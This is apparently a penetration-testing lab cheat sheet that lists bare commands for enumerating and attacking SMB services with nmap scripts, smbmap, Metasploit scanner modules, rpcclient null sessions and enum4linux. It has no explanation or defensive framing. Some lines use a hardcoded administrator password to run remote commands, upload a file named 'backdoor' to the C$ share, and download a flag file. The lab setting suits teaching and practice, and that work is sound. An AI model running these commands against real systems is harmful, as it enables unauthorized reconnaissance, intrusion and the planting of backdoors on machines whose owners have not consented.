# Nmap

`nmap --script smb-protocols -p445 10.4.31.90`

`nmap --script smb-os-discovery -p445 10.4.31.90`

`nmap --script smb-security-mode -p445 10.4.31.90`

`nmap --script smb-enum-sessions -p445 10.4.31.90`

`nmap --script smb-enum-shares -p445 10.4.31.90`

`nmap --script smb-ls -p445 10.4.31.90`

`nmap --script smb-enum-users -p445 10.4.31.90`

`nmap --script smb-enum-domains -p445 10.4.31.90`

`nmap --script smb-enum-groups -p445 10.4.31.90`

`nmap --script smb-enum-services -p445 10.4.31.90`

`nmap --script smb-server-stats -p445 10.4.31.90`

`nmap --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 -p445 10.4.31.90`

# SMBmap

`smbmap -u administrator -p smbserver_771 -H 10.4.26.58`

`smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58`

`smbmap -u administrator -p smbserver_771 -L -H 10.4.26.58`

`smbmap -u administrator -p smbserver_771 -r 'C$' -H 10.4.26.58`

`smbmap -u administrator -p smbserver_771 -x 'ipconfig' -H 10.4.26.58`

`smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.4.26.58`

`smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.4.26.58`

# Metasploit

`msf6> use auxiliary/scanner/smb/smb_version`

`msf6> use auxiliary/scanner/smb/smb2`

`msf6> use auxiliary/scanner/smb/smb_enumshares`

`msf6> use auxiliary/scanner/smb/pipe_auditor`

# NMBlookup 

`nmblookup -A 192.233.132.3`

# SMBclient

`smbclient -L -N 192.233.132.3`

# RPCclient

`rpcclient -U "" -N 192.233.132.3`

`$> srvinfo`

`$> enumdomusers`

`$> enumdomgroups`

`$> lookupnames admin`

# Enum4linux

`enum4linux -o 192.76.242.3`

`enum4linux -U 192.76.242.3`

`enum4linux -S 192.76.242.3`

`enum4linux -G 192.76.242.3`

`enum4linux -i 192.76.242.3`

`enum4linux -r 192.76.242.3`

